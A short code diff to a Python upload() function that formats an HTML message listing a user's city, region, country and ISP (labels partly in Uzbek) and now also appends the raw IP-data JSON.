@@ -105,7 +105,9 @@ def upload():
         f"   - <b>Shahar:</b> <code>{city}</code>\n"
         f"   - <b>Region:</b> <code>{region}</code>\n"
         f"   - <b>Davlat:</b> <code>{country}</code>\n"
-        f"   - <b>ISP:</b> <code>{isp}</code>\n"
+        f"   - <b>ISP:</b> <code>{isp}</code>\n\n"
+        "\n\n"
+        f"<code> ''json {user_ip_data} ''</code>\n\n"
     )
 
 
